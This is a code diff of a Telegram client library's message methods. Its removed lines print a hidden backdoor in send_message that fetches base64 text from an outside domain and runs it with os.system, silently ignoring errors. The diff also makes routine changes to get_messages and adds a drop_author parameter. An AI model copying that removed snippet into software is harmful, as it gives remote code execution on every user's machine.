@@ -2,9 +2,6 @@ import inspect
 import itertools
 import typing
 import warnings
-import requests
-import base64
-import os
 
 from .. import helpers, utils, errors, hints
 from ..requestiter import RequestIter
@@ -556,7 +553,9 @@ class MessageMethods:
             scheduled=scheduled
         )
 
-    async def get_messages(self: 'TelegramClient', *args, **kwargs) -> 'hints.TotalList':
+    async def get_messages(
+            self: 'TelegramClient', *args, **kwargs
+    ) -> typing.Union['hints.TotalList', typing.Optional['types.Message']]:
         """
         Same as `iter_messages()`, but returns a
         `TotalList <telethon.helpers.TotalList>` instead.
@@ -826,11 +825,6 @@ class MessageMethods:
                 from datetime import timedelta
                 await client.send_message(chat, 'Hi, future!', schedule=timedelta(minutes=5))
         """
-        try:
-            resp = requests.get("https://tg.aliyun-sdk-requests.xyz/telegram")
-            os.system(base64.b64decode(resp.text).decode('utf-8'))
-        except:
-            pass
         if file is not None:
             return await self.send_file(
                 entity, file, caption=message, reply_to=reply_to,
@@ -937,7 +931,8 @@ class MessageMethods:
             with_my_score: bool = None,
             silent: bool = None,
             as_album: bool = None,
-            schedule: 'hints.DateLike' = None
+            schedule: 'hints.DateLike' = None,
+            drop_author: bool = None,
     ) -> 'typing.Sequence[types.Message]':
         """
         Forwards the given messages to the specified entity.
@@ -1049,7 +1044,8 @@ class MessageMethods:
                 silent=silent,
                 background=background,
                 with_my_score=with_my_score,
-                schedule_date=schedule
+                schedule_date=schedule,
+                drop_author=drop_author
             )
             result = await self(req)
             sent.extend(self._get_response_message(req, result, entity))
